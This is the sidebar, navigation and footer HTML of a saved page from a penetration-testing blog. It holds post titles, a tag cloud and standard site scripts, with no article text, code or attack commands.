<div class="nav-links"><div class="nav-previous"><a href="https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/" rel="prev"><i class="fa fa-chevron-left"></i> <span class="post-title">Art of Anti Detection 2 – PE Backdoor Manufacturing</span></a></div><div class="nav-next"><a href="https://pentest.blog/unexpected-journey-into-the-alienvault-ossimusm-during-engagement/" rel="next"><span class="post-title">Unexpected Journey into the AlienVault OSSIM/USM During Engagement <i class="fa fa-chevron-right"></i></span></a></div></div>
</nav>
</main>
</div>
</div>
<div id="secondary" class="widget-area col-sm-12 col-md-4" role="complementary">
<div class="well">
<aside id="sparkling-social-2" class="widget sparkling-social"><h3 class="widget-title">Follow us</h3>

<div class="social-icons sticky-sidebar-social">
<nav id="menu-social" class="social-icons"><ul id="menu-social-items" class="social-menu"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15"><a href="https://twitter.com/pentestblog"><i class="social_icon"><span>Follow Us on Twitter</span></i></a></li>
<li id="menu-item-16" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-16"><a href="mailto:mehmet@mehmetince.net"><i class="social_icon"><span>Mail</span></i></a></li>
<li id="menu-item-17" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17"><a href="https://pentest.blog/feed/"><i class="social_icon"><span>RSS Feed</span></i></a></li>
<li id="menu-item-473" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-473"><a href="https://plus.google.com/b/104119310868709707328/"><i class="social_icon"><span>Google</span></i></a></li>
</ul></nav>
</div>
</aside><aside id="search-2" class="widget widget_search">
<form role="search" method="get" class="form-search" action="https://pentest.blog/">
<div class="input-group">
<label class="screen-reader-text" for="s">Search for:</label>
<input type="text" class="form-control search-query" placeholder="Search…" value="" name="s" title="Search for:">
<span class="input-group-btn">
<button type="submit" class="btn btn-default" name="submit" id="searchsubmit" value="Search" style=""><span class="glyphicon glyphicon-search"></span></button>
</span>
</div>
</form>
</aside><aside id="sparkling_popular_posts-2" class="widget sparkling-popular-posts"><h3 class="widget-title">Popular Posts</h3>

<div class="popular-posts-wrapper">

<div class="post">

<div class="post-image ">
<a href="https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/">
<img width="60" height="60" src="./Windows Privilege Escalation Methods_files/camera-door-60x60.jpg" class="attachment-tab-small size-tab-small wp-post-image" alt="" srcset="https://pentest.blog/wp-content/uploads/camera-door-60x60.jpg 60w, https://pentest.blog/wp-content/uploads/camera-door-150x150.jpg 150w" sizes="(max-width: 60px) 100vw, 60px"> </a>
</div> 

<div class="post-content">
<a href="https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/">Art of Anti Detection 2 – PE Backdoor Manufacturing</a>
<span class="date">January 10, 2017</span>
</div>
</div>

<div class="post">

<div class="post-image ">
<a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">
<img width="60" height="60" src="./Windows Privilege Escalation Methods_files/taking-down-windows-nazi-60x60.jpg" class="attachment-tab-small size-tab-small wp-post-image" alt="" srcset="https://pentest.blog/wp-content/uploads/taking-down-windows-nazi-60x60.jpg 60w, https://pentest.blog/wp-content/uploads/taking-down-windows-nazi-150x150.jpg 150w" sizes="(max-width: 60px) 100vw, 60px"> </a>
</div> 

<div class="post-content">
<a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">Windows Privilege Escalation Methods for Pentesters</a>
<span class="date">January 18, 2017</span>
</div>
</div>

<div class="post">

<div class="post-image ">
<a href="https://pentest.blog/explore-hidden-networks-with-double-pivoting/">
<img width="60" height="60" src="./Windows Privilege Escalation Methods_files/double-pivot-60x60.jpg" class="attachment-tab-small size-tab-small wp-post-image" alt="" srcset="https://pentest.blog/wp-content/uploads/double-pivot-60x60.jpg 60w, https://pentest.blog/wp-content/uploads/double-pivot-150x150.jpg 150w" sizes="(max-width: 60px) 100vw, 60px"> </a>
</div> 

<div class="post-content">
<a href="https://pentest.blog/explore-hidden-networks-with-double-pivoting/">Explore Hidden Networks With Double Pivoting</a>
<span class="date">December 31, 2016</span>
</div>
</div>

<div class="post">

<div class="post-image ">
<a href="https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/">
<img width="60" height="60" src="./Windows Privilege Escalation Methods_files/northern-lights-225525_1280-60x60.jpg" class="attachment-tab-small size-tab-small wp-post-image" alt="" srcset="https://pentest.blog/wp-content/uploads/northern-lights-225525_1280-60x60.jpg 60w, https://pentest.blog/wp-content/uploads/northern-lights-225525_1280-150x150.jpg 150w" sizes="(max-width: 60px) 100vw, 60px"> </a>
</div> 

<div class="post-content">
<a href="https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/">Unexpected Journey #4 – Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log &amp; Event Manager (SIEM) Product</a>
<span class="date">March 17, 2017</span>
</div>
</div>

<div class="post">

<div class="post-image ">
<a href="https://pentest.blog/how-to-perform-ddos-test-as-a-pentester/">
<img width="60" height="60" src="./Windows Privilege Escalation Methods_files/ddos-60x60.jpg" class="attachment-tab-small size-tab-small wp-post-image" alt="" srcset="https://pentest.blog/wp-content/uploads/ddos-60x60.jpg 60w, https://pentest.blog/wp-content/uploads/ddos-150x150.jpg 150w" sizes="(max-width: 60px) 100vw, 60px"> </a>
</div> 

<div class="post-content">
<a href="https://pentest.blog/how-to-perform-ddos-test-as-a-pentester/">How to Perform DDoS Test as a Pentester</a>
<span class="date">December 3, 2016</span>
</div>
</div>
</div> 
</aside><aside id="text-3" class="widget widget_text"><h3 class="widget-title">Proactive Defense Against Future Threats</h3> <div class="textwidget"><a href="https://www.prodaft.com/?source=pentest.blog"><img src="./Windows Privilege Escalation Methods_files/prodaft-logo.jpg"></a></div>
</aside> <aside id="recent-posts-2" class="widget widget_recent_entries"> <h3 class="widget-title">Recent Posts</h3> <ul>
<li>
<a href="https://pentest.blog/n-ways-to-unpack-mobile-malware/">N Ways to Unpack Mobile Malware</a>
</li>
<li>
<a href="https://pentest.blog/advisory-mailcleaner-community-edition-remote-code-execution/">Advisory | MailCleaner Community Edition Remote Code Execution CVE-2018-20323</a>
</li>
<li>
<a href="https://pentest.blog/offensive-iat-hooking/">Offensive IAT Hooking</a>
</li>
<li>
<a href="https://pentest.blog/unexpected-journey-6-all-ways-lead-to-rome-remote-code-execution-on-microfocus-secure-messaging-gateway/">Unexpected Journey #6 – All ways lead to Rome ! Remote Code Execution on MicroFocus Secure Messaging Gateway</a>
</li>
<li>
<a href="https://pentest.blog/advisory-manageengine-applications-manager-remote-code-execution-sqli-and/">Advisory | ManageEngine Applications Manager Remote Code Execution and SQLi</a>
</li>
</ul>
</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">Latest Comments</h3><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link"><a href="https://github.com/EgeBalci" rel="external nofollow" class="url">Ege Balci</a></span> on <a href="https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/#comment-1244">Art of Anti Detection 3 – Shellcode Alchemy</a></li><li class="recentcomments"><span class="comment-author-link">Chase Run Taylor</span> on <a href="https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/#comment-1243">Art of Anti Detection 1 – Introduction to AV &amp; Detection Techniques</a></li><li class="recentcomments"><span class="comment-author-link"><a href="http://www.mehmetince.net/" rel="external nofollow" class="url">Mehmet İnce</a></span> on <a href="https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1242">Unexpected Journey #4 – Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log &amp; Event Manager (SIEM) Product</a></li><li class="recentcomments"><span class="comment-author-link">0x00</span> on <a href="https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1241">Unexpected Journey #4 – Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log &amp; Event Manager (SIEM) Product</a></li><li class="recentcomments"><span class="comment-author-link"><a href="http://www.mehmetince.net/" rel="external nofollow" class="url">Mehmet İnce</a></span> on <a href="https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1240">Unexpected Journey #4 – Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log &amp; Event Manager (SIEM) Product</a></li></ul></aside><aside id="tag_cloud-2" class="widget widget_tag_cloud"><h3 class="widget-title">Tags</h3><div class="tagcloud" style=""><a href="https://pentest.blog/tag/0day/" class="tag-cloud-link tag-link-70 tag-link-position-1" style="font-size: 22pt;" aria-label="0day (9 items)">0day</a>
<a href="https://pentest.blog/tag/1day/" class="tag-cloud-link tag-link-67 tag-link-position-2" style="font-size: 11.6pt;" aria-label="1day (2 items)">1day</a>
<a href="https://pentest.blog/tag/advisory/" class="tag-cloud-link tag-link-66 tag-link-position-3" style="font-size: 16pt;" aria-label="advisory (4 items)">advisory</a>
<a href="https://pentest.blog/tag/antidetection/" class="tag-cloud-link tag-link-65 tag-link-position-4" style="font-size: 8pt;" aria-label="antidetection (1 item)">antidetection</a>
<a href="https://pentest.blog/tag/backdoors/" class="tag-cloud-link tag-link-37 tag-link-position-5" style="font-size: 8pt;" aria-label="backdoors (1 item)">backdoors</a>
<a href="https://pentest.blog/tag/binary/" class="tag-cloud-link tag-link-40 tag-link-position-6" style="font-size: 8pt;" aria-label="binary (1 item)">binary</a>
<a href="https://pentest.blog/tag/burp/" class="tag-cloud-link tag-link-52 tag-link-position-7" style="font-size: 11.6pt;" aria-label="burp (2 items)">burp</a>
<a href="https://pentest.blog/tag/bypass/" class="tag-cloud-link tag-link-78 tag-link-position-8" style="font-size: 11.6pt;" aria-label="bypass (2 items)">bypass</a>
<a href="https://pentest.blog/tag/crypter/" class="tag-cloud-link tag-link-27 tag-link-position-9" style="font-size: 11.6pt;" aria-label="crypter (2 items)">crypter</a>
<a href="https://pentest.blog/tag/ddos/" class="tag-cloud-link tag-link-42 tag-link-position-10" style="font-size: 8pt;" aria-label="ddos (1 item)">ddos</a>
<a href="https://pentest.blog/tag/dns/" class="tag-cloud-link tag-link-15 tag-link-position-11" style="font-size: 16pt;" aria-label="dns (4 items)">dns</a>
<a href="https://pentest.blog/tag/dos/" class="tag-cloud-link tag-link-43 tag-link-position-12" style="font-size: 8pt;" aria-label="dos (1 item)">dos</a>
<a href="https://pentest.blog/tag/exploit/" class="tag-cloud-link tag-link-77 tag-link-position-13" style="font-size: 11.6pt;" aria-label="exploit (2 items)">exploit</a>
<a href="https://pentest.blog/tag/flood/" class="tag-cloud-link tag-link-54 tag-link-position-14" style="font-size: 8pt;" aria-label="flood (1 item)">flood</a>
<a href="https://pentest.blog/tag/fud/" class="tag-cloud-link tag-link-26 tag-link-position-15" style="font-size: 8pt;" aria-label="fud (1 item)">fud</a>
<a href="https://pentest.blog/tag/icmp/" class="tag-cloud-link tag-link-17 tag-link-position-16" style="font-size: 11.6pt;" aria-label="icmp (2 items)">icmp</a>
<a href="https://pentest.blog/tag/llmnr/" class="tag-cloud-link tag-link-56 tag-link-position-17" style="font-size: 8pt;" aria-label="llmnr (1 item)">llmnr</a>
<a href="https://pentest.blog/tag/malware/" class="tag-cloud-link tag-link-25 tag-link-position-18" style="font-size: 14pt;" aria-label="malware (3 items)">malware</a>
<a href="https://pentest.blog/tag/metasploit/" class="tag-cloud-link tag-link-61 tag-link-position-19" style="font-size: 17.6pt;" aria-label="metasploit (5 items)">metasploit</a>
<a href="https://pentest.blog/tag/mitm/" class="tag-cloud-link tag-link-49 tag-link-position-20" style="font-size: 8pt;" aria-label="mitm (1 item)">mitm</a>
<a href="https://pentest.blog/tag/netbios/" class="tag-cloud-link tag-link-48 tag-link-position-21" style="font-size: 8pt;" aria-label="netbios (1 item)">netbios</a>
<a href="https://pentest.blog/tag/network/" class="tag-cloud-link tag-link-31 tag-link-position-22" style="font-size: 8pt;" aria-label="network (1 item)">network</a>
<a href="https://pentest.blog/tag/office-exploit/" class="tag-cloud-link tag-link-24 tag-link-position-23" style="font-size: 8pt;" aria-label="office exploit (1 item)">office exploit</a>
<a href="https://pentest.blog/tag/packer/" class="tag-cloud-link tag-link-81 tag-link-position-24" style="font-size: 11.6pt;" aria-label="packer (2 items)">packer</a>
<a href="https://pentest.blog/tag/patching/" class="tag-cloud-link tag-link-63 tag-link-position-25" style="font-size: 8pt;" aria-label="patching (1 item)">patching</a>
<a href="https://pentest.blog/tag/phishing/" class="tag-cloud-link tag-link-21 tag-link-position-26" style="font-size: 8pt;" aria-label="phishing (1 item)">phishing</a>
<a href="https://pentest.blog/tag/pivoting/" class="tag-cloud-link tag-link-57 tag-link-position-27" style="font-size: 8pt;" aria-label="pivoting (1 item)">pivoting</a>
<a href="https://pentest.blog/tag/privilege-escalation/" class="tag-cloud-link tag-link-60 tag-link-position-28" style="font-size: 8pt;" aria-label="privilege escalation (1 item)">privilege escalation</a>
<a href="https://pentest.blog/tag/responder/" class="tag-cloud-link tag-link-50 tag-link-position-29" style="font-size: 8pt;" aria-label="responder (1 item)">responder</a>
<a href="https://pentest.blog/tag/reversing/" class="tag-cloud-link tag-link-41 tag-link-position-30" style="font-size: 8pt;" aria-label="reversing (1 item)">reversing</a>
<a href="https://pentest.blog/tag/routing/" class="tag-cloud-link tag-link-58 tag-link-position-31" style="font-size: 8pt;" aria-label="routing (1 item)">routing</a>
<a href="https://pentest.blog/tag/shellcode/" class="tag-cloud-link tag-link-73 tag-link-position-32" style="font-size: 11.6pt;" aria-label="shellcode (2 items)">shellcode</a>
<a href="https://pentest.blog/tag/sql-injection/" class="tag-cloud-link tag-link-13 tag-link-position-33" style="font-size: 14pt;" aria-label="sql injection (3 items)">sql injection</a>
<a href="https://pentest.blog/tag/sqlmap/" class="tag-cloud-link tag-link-62 tag-link-position-34" style="font-size: 11.6pt;" aria-label="sqlmap (2 items)">sqlmap</a>
<a href="https://pentest.blog/tag/ssh/" class="tag-cloud-link tag-link-16 tag-link-position-35" style="font-size: 8pt;" aria-label="ssh (1 item)">ssh</a>
<a href="https://pentest.blog/tag/tcp/" class="tag-cloud-link tag-link-45 tag-link-position-36" style="font-size: 8pt;" aria-label="tcp (1 item)">tcp</a>
<a href="https://pentest.blog/tag/tunneling/" class="tag-cloud-link tag-link-14 tag-link-position-37" style="font-size: 8pt;" aria-label="tunneling (1 item)">tunneling</a>
<a href="https://pentest.blog/tag/udp/" class="tag-cloud-link tag-link-44 tag-link-position-38" style="font-size: 8pt;" aria-label="udp (1 item)">udp</a>
<a href="https://pentest.blog/tag/wep/" class="tag-cloud-link tag-link-33 tag-link-position-39" style="font-size: 8pt;" aria-label="wep (1 item)">wep</a>
<a href="https://pentest.blog/tag/windows/" class="tag-cloud-link tag-link-51 tag-link-position-40" style="font-size: 14pt;" aria-label="windows (3 items)">windows</a>
<a href="https://pentest.blog/tag/wireless/" class="tag-cloud-link tag-link-30 tag-link-position-41" style="font-size: 8pt;" aria-label="wireless (1 item)">wireless</a>
<a href="https://pentest.blog/tag/word/" class="tag-cloud-link tag-link-23 tag-link-position-42" style="font-size: 8pt;" aria-label="word (1 item)">word</a>
<a href="https://pentest.blog/tag/wpa/" class="tag-cloud-link tag-link-32 tag-link-position-43" style="font-size: 8pt;" aria-label="wpa (1 item)">wpa</a>
<a href="https://pentest.blog/tag/wpa2/" class="tag-cloud-link tag-link-35 tag-link-position-44" style="font-size: 8pt;" aria-label="wpa2 (1 item)">wpa2</a>
<a href="https://pentest.blog/tag/wpad/" class="tag-cloud-link tag-link-46 tag-link-position-45" style="font-size: 8pt;" aria-label="wpad (1 item)">wpad</a></div>
</aside><aside id="custom_html-3" class="widget_text widget widget_custom_html"><h3 class="widget-title">Awarded Top 15 Pentest Blog</h3><div class="textwidget custom-html-widget"><a href="https://blog.feedspot.com/pentest_blogs/" title="Pentest Blogs" target="_blank" rel="noopener noreferrer"><img alt="Pentest Blogs" src="./Windows Privilege Escalation Methods_files/pentest_1000px.png"></a></div></aside> </div>
</div>
</div>
</div>
</div>
<div id="footer-area">
<div class="container footer-inner">
<div class="row">
</div>
</div>
<footer id="colophon" class="site-footer" role="contentinfo">
<div class="site-info container">
<div class="row">
<nav role="navigation" class="col-md-6">
</nav>
<div class="copyright col-md-6">
by PRODAFT LLC ninja team <img draggable="false" class="emoji" alt="⚔️" src="./Windows Privilege Escalation Methods_files/2694.svg"> Theme by <a href="http://colorlib.com/" target="_blank">Colorlib</a> Powered by <a href="http://wordpress.org/" target="_blank">WordPress</a> </div>
</div>
</div>
<div class="scroll-to-top" style="display: block;"><i class="fa fa-angle-up"></i></div>
</footer>
</div>
</div>
<script type="text/javascript">
		  jQuery(document).ready(function ($) {
			if ($(window).width() >= 767) {
			  $('.navbar-nav > li.menu-item > a').click(function () {
				if ($(this).attr('target') !== '_blank') {
				  window.location = $(this).attr('href')
				}
			  })
			}
		  })
		</script>
<script type="text/javascript">
/* <![CDATA[ */
var countVars = {"disqusShortname":"pentestblog"};
/* ]]> */
</script>
<script type="text/javascript" src="./Windows Privilege Escalation Methods_files/comment_count.js.download"></script>
<script type="text/javascript">
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.17"},"disqusIdentifier":"454 https:\/\/pentest.blog\/?p=454","disqusShortname":"pentestblog","disqusTitle":"Windows Privilege Escalation Methods for Pentesters","disqusUrl":"https:\/\/pentest.blog\/windows-privilege-escalation-methods-for-pentesters\/","postId":"454"};
/* ]]> */
</script>
<script type="text/javascript" src="./Windows Privilege Escalation Methods_files/comment_embed.js.download"></script>
<script type="text/javascript" src="./Windows Privilege Escalation Methods_files/skip-link-focus-fix.min.js.download"></script>
<script type="text/javascript" src="./Windows Privilege Escalation Methods_files/comment-reply.min.js.download"></script>
<script type="text/javascript" src="./Windows Privilege Escalation Methods_files/mootools-core-yc.js.download"></script>
<script type="text/javascript" src="./Windows Privilege Escalation Methods_files/EnlighterJS.min.js.download"></script>
<script type="text/javascript" src="./Windows Privilege Escalation Methods_files/EnlighterJS.init.js.download"></script>
<script type="text/javascript" src="./Windows Privilege Escalation Methods_files/wp-embed.min.js.download"></script>


<iframe style="display: none;" src="./Windows Privilege Escalation Methods_files/saved_resource(1).html"></iframe></body></html>